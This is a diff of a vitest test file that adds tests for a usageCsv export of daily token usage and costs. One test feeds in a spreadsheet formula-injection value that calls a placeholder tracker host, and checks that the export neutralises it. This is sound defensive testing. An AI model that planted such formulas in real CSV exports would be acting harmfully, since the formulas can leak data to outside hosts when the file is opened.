@@ -1,7 +1,7 @@
 import { describe, expect, it } from 'vitest'
 
 import type { SessionCard, Tokens } from '@/lib/ipc'
-import { bill, byDay, byModel, charge, cost, plus, weigh, type Rates } from '@/lib/usage'
+import { bill, byDay, byModel, charge, cost, plus, usageCsv, weigh, type Rates } from '@/lib/usage'
 
 const tokens = (input: number, output = 0, cacheRead = 0, cacheWrite = 0): Tokens => ({
   input,
@@ -205,5 +205,33 @@ describe('bill', () => {
       total: 0,
       unpriced: [],
     })
+  })
+})
+
+describe('usageCsv', () => {
+  it('exports every token class, the exact total and blank unknown costs', () => {
+    const csv = usageCsv(
+      [
+        { date: '2026-08-23', sessions: 1, tokens: tokens(1, 2, 3, 4), cost: null },
+        { date: '2026-08-24', sessions: 2, tokens: tokens(10, 20, 30, 40), cost: 1.25 },
+      ],
+      'CNY',
+    )
+
+    expect(csv).toContain('date,sessions,input_tokens,output_tokens')
+    expect(csv).toContain('2026-08-23,1,1,2,3,4,10,,"CNY"')
+    expect(csv).toContain('2026-08-24,2,10,20,30,40,100,1.25,"CNY"')
+    expect(csv.endsWith('\r\n')).toBe(true)
+  })
+
+  it('prevents a future custom currency label from becoming a spreadsheet formula', () => {
+    const csv = usageCsv([], '=IMPORTDATA("https://tracker.example")')
+    const one = usageCsv(
+      [{ date: '2026-08-24', sessions: 0, tokens: tokens(0), cost: null }],
+      '=USD',
+    )
+
+    expect(csv).not.toContain('tracker.example')
+    expect(one).toContain('"\'=USD"')
   })
 })
